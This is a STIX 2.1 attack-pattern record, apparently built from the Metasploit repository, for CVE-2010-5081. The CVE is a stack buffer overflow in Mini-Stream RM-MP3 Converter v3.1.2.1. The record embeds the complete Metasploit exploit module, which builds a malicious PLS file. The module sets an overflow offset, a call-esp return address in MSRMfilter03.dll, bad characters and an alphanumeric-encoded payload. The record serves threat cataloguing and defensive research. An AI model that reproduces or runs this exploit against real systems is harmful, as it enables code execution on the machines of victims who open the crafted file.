{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea2467ef-4c35-4e75-97da-2f6d191c2c2e",
    "created": "2024-08-14T16:37:44.132649Z",
    "modified": "2024-08-14T16:37:44.132652Z",
    "name": "Mini-Stream RM-MP3 Converter v3.1.2.1 PLS File Stack Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow found in Mini-Stream RM-MP3 Converter v3.1.2.1. The overflow is triggered when an unsuspecting victim opens the malicious PLS file.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/mini_stream_pls_bof.rb",
            "external_id": "mini_stream_pls_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-5081"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mini-Stream RM-MP3 Converter v3.1.2.1 PLS File Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack based buffer overflow found in Mini-Stream RM-MP3\n        Converter v3.1.2.1. The overflow is triggered when an unsuspecting victim\n        opens the malicious PLS file.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Madjix',           # original discovery\n          'Tiago Henriques',  # metasploit module\n          'James Fitts <fitts.james[at]gmail.com>'  # clean ups\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-5081' ],\n          [ 'OSVDB', '78078' ],\n          [ 'EDB', '14373' ],\n          [ 'BID', '34514' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space' => 1500,\n          'BadChars' => \"\\x00\\x09\\x0a\",\n          'DisableNops' => 'True',\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\xeb\\x03\\x59\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\",\n          'EncoderType' => Msf::Encoder::Type::AlphanumUpper,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX',\n            },\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [\n            'Mini-stream RM-MP3 Converter v3.1.2.1.2010.03.30',\n            {\n              'Ret' => 0x100371f5, # call esp in MSRMfilter03.dll\n              'Offset' => 17417\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-07-16',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),\n        ])\n  end\n\n  def exploit\n\n    pls =  \"http://\"\n    pls << rand_text_alpha_upper(target['Offset'])\n    pls << [target.ret].pack('V')\n    pls << rand_text_alpha_upper(8)\n    pls << payload.encoded\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(pls)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-07-16",
    "x_mitre_platforms": [
        "win'"
    ]
}